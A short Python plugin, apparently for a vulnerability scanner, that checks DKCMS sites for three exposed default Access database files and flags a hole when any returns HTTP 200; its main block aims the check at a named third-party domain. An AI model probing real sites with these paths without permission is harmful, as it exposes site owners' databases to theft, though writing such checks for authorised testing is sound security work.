#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'


def assign(service, arg):
    if service == "dkcms":
        return True, arg

def audit(arg):
    url = arg
    db_list=['data/dkcm_ssdfhwejkfs.mdb','_data/___dkcms_30_free.mdb','_data/I^(()UU()H.mdb']
    for db in db_list:
        code, head, res, errcode, _ = curl.curl(url+db)
        if code == 200:
            security_hole(url+db)
            return

if __name__ == '__main__':
    from dummy import *
    audit(assign('dkcms', 'http://bzxlcj.com/')[1])


